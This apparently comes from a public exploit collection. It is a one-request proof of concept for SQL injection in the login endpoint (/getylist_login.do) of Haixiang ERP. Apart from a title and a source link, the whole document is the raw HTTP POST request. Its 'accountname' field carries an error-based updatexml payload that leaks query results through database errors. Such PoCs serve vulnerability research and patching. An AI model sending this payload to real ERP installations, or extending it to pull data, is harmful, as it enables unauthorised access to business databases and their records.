# haixiangERP_getylist_login_sqli

from: https://mp.weixin.qq.com/s/5GCq5nuZVd7W6srj1ns9xQ
```
POST /getylist_login.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 77
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

accountname=test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--
```
